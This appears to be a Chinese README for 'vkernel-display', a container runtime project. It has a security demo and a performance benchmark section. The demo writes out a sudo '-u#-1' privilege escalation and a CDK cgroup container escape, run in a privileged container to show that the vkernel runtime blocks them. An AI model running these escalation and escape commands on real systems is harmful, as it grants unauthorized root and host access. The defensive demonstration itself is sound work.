# vkernel-display

## 安全演示
事前准备
```bash
# 1. 构建镜像
cd cve
docker build -t vkernel-cve .

# 2. 构建出限制 setresuid(-1, x, x) 的 vkernel.ko，然后安装
# ...
```
操作演示
```bash
# 启动镜像
docker run --rm --name vkernel-cve-test -d -p 2222:22 --privileged vkernel-cve

# 连接到 vkernel-cve-test 容器中的 testuser 中
ssh -l testuser 127.0.0.1 -p 2222

# 提权
sudo -u#-1 /bin/bash

# 使用 CDK 通过 cgroup 漏洞进行容器逃逸
cdk run mount-cgroup "shell command"
# cdk run mount-cgroup "touch /tmp/123.txt"

# 对比 --runtime=vkernel-runtime 的容器
# 步骤相同，会发现无法提权
```

## 性能测试
事前准备
```bash
# 编译打包前端资源
cd benchmakr-src
npm install
npm run build

# 启动前端 web 服务
cd ../web-server
./run.sh
```
操作演示
```bash
cd ./scripts

# 测试 nginx
./nginx.sh

# 测试 pwgen
./pwgen
```